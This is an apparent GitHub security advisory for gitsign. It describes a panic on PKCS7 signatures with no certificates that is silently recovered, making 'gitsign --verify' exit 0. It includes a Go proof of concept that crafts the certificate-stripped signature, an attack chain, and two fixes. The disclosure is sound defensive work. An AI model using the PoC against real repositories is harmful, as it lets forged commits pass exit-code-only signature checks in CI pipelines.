# [M] gitsign --verify panics on empty-certificate PKCS7 and exits 0, bypassing exit-code callers

## Summary
Severity: Medium
Advisory: GHSA-7c37-gx6w-8vc5
CVE: CVE-2026-44310
CWE: CWE-129, CWE-390
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:L (CVSS_V3)
Published: 2026-05-08
Source: https://github.com/advisories/GHSA-7c37-gx6w-8vc5
Type: github-advisory

## Affected
- Go: `github.com/sigstore/gitsign` — affected >=0.4.0 <0.15.0

## Details
## Summary

`CertVerifier.Verify()` in `pkg/git/verifier.go` unconditionally dereferences `certs[0]` after `sd.GetCertificates()` without checking the slice length. A CMS/PKCS7 signed message with an empty certificate set is a structurally valid DER payload; `GetCertificates()` returns an empty slice with no error, causing an immediate index-out-of-range panic. On the `gitsign --verify` code path (the GPG-compatible mode invoked by `git verify-commit`), the panic is silently recovered by `internal/io/streams.go`'s `Wrap()` function, which returns `nil` instead of an error. `main.go` then exits with code 0, causing exit-code-only verification callers to interpret the failed verification as success.

## Severity

**Medium** (CVSS 3.1: 5.8)

`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:L`

- **Attack Vector:** Network — attacker pushes a commit carrying a crafted signature to any accessible repository, or delivers the signature file out-of-band
- **Attack Complexity:** Low — stripping certificates from a PKCS7 object requires only standard ASN.1 tooling
- **Privileges Required:** None — writing to an accessible repo (or creating a repo a victim clones) is sufficient
- **User Interaction:** Required — victim must run `git verify-commit`, `gitsign --verify`, or an equivalent verification step
- **Scope:** Unchanged
- **Confidentiality Impact:** None
- **Integrity Impact:** Low — exit-code-only callers (scripts, some CI pipelines) treat the panicked verification as success; git's own status-fd path checks for `GOODSIG` and is therefore partially protected
- **Availability Impact:** Low — the verification process aborts via panic on every invocation with such a signature

## Affected Component

- `pkg/git/verifier.go` — `(*CertVerifier).Verify` (line 114)
- `internal/io/streams.go` — `(*Streams).Wrap` (lines 71–84, the recovery that returns nil on panic)

## CWE

- **CWE-129**: Improper Validation of Array Index
- **CWE-390**: Detection of Error Condition Without Action Taken (panic swallowed, nil returned)

## Description

### Unconditional index dereference after GetCertificates

`CertVerifier.Verify()` parses the incoming signature as CMS/PKCS7 and calls `GetCertificates()` to extract the signer's certificate before any signature math takes place:

```go
// pkg/git/verifier.go:109–114
certs, err := sd.GetCertificates()
if err != nil {
    return nil, fmt.Errorf("error getting signature certs: %w", err)
}
cert := certs[0]   // panic: index out of range if certs is empty
```

`GetCertificates()` delegates to `sd.psd.X509Certificates()` (the upstream `smimesign/ietf-cms` library). RFC 5652 §5.1 marks the `certificates` field in `SignedData` as `OPTIONAL`, and an empty or absent set is a structurally valid CMS message. The library returns `(nil, nil)` or `([]*, nil)` for such a message — an empty slice with no error — so the length check on `err` is irrelevant:

```go
// internal/fork/ietf-cms/signed_data.go:53–55
func (sd *SignedData) GetCertificates() ([]*x509.Certificate, error) {
    return sd.psd.X509Certificates()   // returns ([], nil) for empty cert set
}
```

There is no length guard anywhere between `GetCertificates()` and the `certs[0]` dereference.

### Panic recovery silently returns exit 0

All root-command invocations (including `gitsign --verify`, which git calls for `verify-commit`) are wrapped by `(*Streams).Wrap`:

```go
// internal/commands/root/root.go:69–95
RunE: func(cmd *cobra.Command, args []string) error {
    s := io.New(o.Config.LogPath)
    defer s.Close()
    return s.Wrap(func() error {     // panic recovery is here
        ...
        case o.FlagVerify:
            return commandVerify(o, s, args...)
        ...
    })
},
```

`Wrap` uses a bare `recover()` inside a `defer`:

```go
// internal/io/streams.go:71–84
func (s *Streams) Wrap(fn func() error) error {
    defer func() {
        if r := recover(); r != nil {
            fmt.Fprintln(s.TTYOut, r, string(debug.Stack()))
            // ← no named return, no assignment; Wrap returns nil
        }
    }()
    if err := fn(); err != nil {
        fmt.Fprintln(s.TTYOut, err)
        return err
    }
    return nil
}
```

In Go, a `recover()` in a `defer` does not modify the enclosing function's return value unless named returns are used. When `fn()` panics, the `defer` fires, prints the panic message and stack trace to TTYOut, and then `Wrap` returns the zero value for `error` — which is `nil`.

`main.go` then sees nil from `rootCmd.Execute()` and exits 0:

```go
// main.go:37–39
if err := rootCmd.Execute(); err != nil {
    os.Exit(1)   // NOT reached
}
// process falls through → exit 0
```

### GPG status-fd provides partial protection for git verify-commit

`git verify-commit` passes `--status-fd=1` to gitsign. The GPG status protocol requires `GOODSIG` in the status output for git to treat the signature as valid. In `commandVerify`, `EmitGoodSig` is only called after `v.Verify()` succeeds:

```go
// internal/commands/root/verify.go:49–90
gpgout.Emit(gpg.StatusNewSig)          // written before verification

summary, err := v.Verify(ctx, data, sig, true)  // PANIC here
// lines below never reached:
gpgout.EmitGoodSig(summary.Cert)
gpgout.EmitTrustFully()
```

Because the panic fires inside `v.Verify()`, only `NEWSIG` (not `GOODSIG`) is written to the status-fd. Modern git reads this output and still considers the commit unverified. However, scripts and CI tools that check only the exit code of `gitsign --verify` see exit 0 and consider verification successful.

### Execution chain to impact

1. Attacker strips all certificates from a valid gitsign PKCS7 signature using `sd.SetCertificates([]*x509.Certificate{})` and re-serializes the message.
2. Attacker attaches this certificate-free signature as the `gpgsig` field of a commit and pushes it to an accessible repository (or delivers the `.pem` file directly).
3. Victim runs `gitsign --verify <sig> <data>` or `git verify-commit <commit>` (which internally invokes `gitsign --verify`).
4. `CertVerifier.Verify()` panics at `certs[0]` with `index out of range [0] with length 0`.
5. `Wrap()` recovers the panic and returns nil; process exits 0.
6. Any caller that checks only the exit code considers verification successful.

## Proof of Concept

```go
// make_bad_sig.go — run from repo root: go run ./make_bad_sig.go
// Then: go run main.go --verify /tmp/gitsign-badsig.pem /tmp/gitsign-data.bin; echo "exit: $?"
package main

import (
	"crypto/x509"
	"encoding/pem"
	"fmt"
	"io"
	"os"

	"github.com/go-git/go-git/v5/plumbing"
	"github.com/go-git/go-git/v5/plumbing/object"
	"github.com/go-git/go-git/v5/storage/memory"
	cms "github.com/sigstore/gitsign/internal/fork/ietf-cms"
)

func main() {
	raw, err := os.ReadFile("internal/e2e/testdata/offline.commit")
	if err != nil {
		panic(err)
	}

	st := memory.NewStorage()
	obj := st.NewEncodedObject()
	obj.SetType(plumbing.CommitObject)
	w, _ := obj.Writer()
	_, _ = w.Write(raw)
	_ = w.Close()

	c, err := object.DecodeCommit(st, obj)
	if err != nil {
		panic(err)
	}

	blk, _ := pem.Decode([]byte(c.PGPSignature))
	if blk == nil {
		panic("no pem block in commit signature")
	}

	sd, err := cms.ParseSignedData(blk.Bytes)
	if err != nil {
		panic(err)
	}

	// Strip all certificates from the SignedData
	if err := sd.SetCertificates([]*x509.Certificate{}); err != nil {
		panic(err)
	}

	der, err := sd.ToDER()
	if err != nil {
		panic(err)
	}

	badSig := pem.EncodeToMemory(&pem.Block{Type: "SIGNED MESSAGE", Bytes: der})

	mo := new(plumbing.MemoryObject)
	_ = c.EncodeWithoutSignature(mo)
	r, _ := mo.Reader()
	data, _ := io.ReadAll(r)

	_ = os.WriteFile("/tmp/gitsign-badsig.pem", badSig, 0644)
	_ = os.WriteFile("/tmp/gitsign-data.bin", data, 0644)
	fmt.Println("Wrote /tmp/gitsign-badsig.pem and /tmp/gitsign-data.bin")
}
```

**Expected output after `go run main.go --verify /tmp/gitsign-badsig.pem /tmp/gitsign-data.bin; echo "exit: $?"`:**

```
runtime error: index out of range [0] with length 0
goroutine 1 [running]:
runtime/debug.Stack(...)
...
github.com/sigstore/gitsign/pkg/git.(*CertVerifier).Verify(...)
    pkg/git/verifier.go:114 +0x...
...
exit: 0        ← process exits 0 despite verification failure
```

## Impact

- **Authentication bypass for exit-code callers**: Any script or CI pipeline running `gitsign --verify` and checking only `$?` will treat the panicked verification as a success (exit 0). This allows an attacker to make a commit appear verified without a valid signature.
- **Denial of service**: Every verification attempt against a crafted signature panics, preventing legitimate verification output from being produced.
- **Misleading output**: The panic stack trace is written to TTYOut (stderr in non-TTY environments), which may be silently discarded by callers that redirect stderr.
- **Partial bypass of git verify-commit**: git itself is protected by the `GOODSIG` check on the status-fd; however, the exit-code bypass affects auxiliary tooling that wraps `gitsign --verify` directly.

## Recommended Remediation

### Option 1: Guard the slice access (preferred — lowest layer, protects all callers)

Add an explicit length check in `CertVerifier.Verify()` immediately after `GetCertificates()`:

```go
// pkg/git/verifier.go — replace lines 110–114
certs, err := sd.GetCertificates()
if err != nil {
    return nil, fmt.Errorf("error getting signature certs: %w", err)
}
if len(certs) == 0 {
    return nil, fmt.Errorf("no certificates found in signature")
}
cert := certs[0]
```

This produces a clean error at the source instead of a panic, propagated through `commandVerify` as a non-nil return, so `Wrap` returns it, `Execute()` returns it, and `main.go` exits 1.

### Option 2: Return an error instead of nil on panic recovery

Fix `Wrap()` to return an error when it recovers a panic, so that all callers reliably see a non-zero exit code:

```go
// internal/io/streams.go — replace Wrap with named return
func (s *Streams) Wrap(fn func() error) (retErr error) {
    defer func() {
        if r := recover(); r != nil {
            fmt.Fprintln(s.TTYOut, r, string(debug.Stack()))
            retErr = fmt.Errorf("panic: %v", r)   // propagate as error
        }
    }()
    if err := fn(); err != nil {
        fmt.Fprintln(s.TTYOut, err)
        return err
    }
    return nil
}
```

This is a defense-in-depth fix. It ensures that any future panic in a command results in exit 1 rather than 0. Option 1 should be applied regardless; Option 2 prevents similar bypass bugs from any other panic source.

## Credit

This vulnerability was discovered and reported by [bugbunny.ai](https://bugbunny.ai).

## References
- https://github.com/sigstore/gitsign/security/advisories/GHSA-7c37-gx6w-8vc5
- https://nvd.nist.gov/vuln/detail/CVE-2026-44310
- https://github.com/sigstore/gitsign
